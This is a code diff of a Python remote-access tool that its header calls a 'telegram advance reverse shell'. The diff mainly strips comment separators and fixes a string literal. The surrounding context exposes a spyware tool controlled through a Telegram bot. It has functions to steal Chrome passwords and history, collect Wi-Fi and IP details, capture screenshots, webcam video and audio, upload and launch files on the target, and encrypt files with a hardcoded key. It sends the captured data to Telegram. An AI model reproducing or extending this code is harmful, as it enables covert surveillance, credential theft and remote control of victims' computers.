@@ -1,4 +1,3 @@
-
 ###########################################
 ##            24/05/2022                 ##
 ##     tlegram advance reverse shell     ##
@@ -72,10 +71,10 @@ import math
 import heapq
 
 
-#############################################################
+
 
 telegram_token = 'your telegram token'
-chat_id = 'group chat id
+chat_id = 'group chat id'
 
 class Proccess:
     def start_proc(self):
@@ -226,7 +225,7 @@ class Proccess:
 
 
 
-##############################################################
+
 
 def searsh_chrome_history(url,val):
     up_search_ch_his=0
@@ -245,7 +244,7 @@ def searsh_chrome_history(url,val):
         send_message('not foud.')
     up_search_ch_his=1
 
-###############################################################
+
 
 def histoty_chrome(url,num):
     all_files = [f for f in listdir('C:\\proccess\\sih\\') if isfile(join('C:\\proccess\\sih\\', f))]
@@ -312,7 +311,7 @@ def histoty_chrome(url,num):
     
     
         
-##############################################################
+
 
 def get_currend_directory():
     global dir_resaoult
@@ -348,7 +347,7 @@ def get_currend_directory():
     
     
 
-##############################################################
+
 
 def get_current_location():
     url = "https://mylocation.org/"
@@ -377,11 +376,11 @@ def get_current_location():
     
     send_message(res)
 
-############################################################
+
 
 #no concole speedtest
 
-############################################################
+
 
 def chrome_password2():
     def startchromepass():
@@ -610,7 +609,7 @@ def chrome_password2():
     startchromepass()       
     password()
          
-############################################################
+
 
 class Search_chrome_passwords():
     
@@ -706,7 +705,7 @@ class Search_chrome_passwords():
         
         
 
-############################################################
+
 
 
 def ip_information():
@@ -720,7 +719,7 @@ def ip_information():
     ip_in=['public: '+public_ip,'host name: '+hostname,"private: "+IPAddr]
     
 
-###############################################################
+
 
 
 def upload_files(url,file):
@@ -739,7 +738,6 @@ def upload_files(url,file):
         up_upl=0
         
         
-###############################################################
 
 def satrt_file_on_target(path):
 
@@ -750,7 +748,7 @@ def satrt_file_on_target(path):
         send_message('failed to open '+path)
 
         
-###############################################################
+
 
 
 def record_target(name,timer):
@@ -776,7 +774,7 @@ def record_target(name,timer):
         Delet_files().delet_files_list(path_rec)
     except:
         pass
-###############################################################
+
 
 
 
@@ -827,7 +825,7 @@ class Delet_files():
         c = p.stdout.readline()
        
     
-############################################################
+
 
 
 
@@ -934,7 +932,7 @@ def wifi_info():
     
 
 
-#################################################################
+
 def open_camera(name_vid):
     global name_video
     name_video=name_vid
@@ -975,7 +973,7 @@ def open_camera(name_vid):
         requests.post("https://api.telegram.org/bot"+telegram_token+"/sendVideo?chat_id="+chat_id+"&caption=test.mp4" ,files=files)
         
 
-################################################################
+
 
 key = b'm3mVGQlx_lB2qfaBw7ksd2DWVKawrh52bGpxczScykE='
 
@@ -1118,7 +1116,7 @@ class Crypt_my10():
         self.start_crypt()
         
         
-#################################################################
+
 
 def send_files_to_target(url,name):
     download = requests.get(url)
@@ -1129,7 +1127,7 @@ def send_files_to_target(url,name):
     except:
         send_message('faild to send file..')
 
-#################################################################
+
 
 
 def screen_shot(name):
@@ -1147,7 +1145,7 @@ def screen_shot(name):
 
 
 
-###################################################################
+
 
 
 def take_picture(name):
@@ -1169,7 +1167,7 @@ def take_picture(name):
         inside_up_crypt=1
 
 
-#################################################################
+
 
 def offset_num():
     global offset
@@ -1192,7 +1190,7 @@ def offset_num():
 
 
 
-##############################################################################
+
 
 def send_message(message):
     message=str(message)
@@ -1204,8 +1202,7 @@ def send_message(message):
         requests.get("https://api.telegram.org/bot"+telegram_token+"/sendMessage?chat_id="+chat_id+"&text="+message)
     
 
-    
-#######################################################################################
+
 
 
 def main():
@@ -1507,7 +1504,7 @@ def main():
         url= ""
         
         
-########################## end
+
 
 if __name__ == "__main__":
     main()
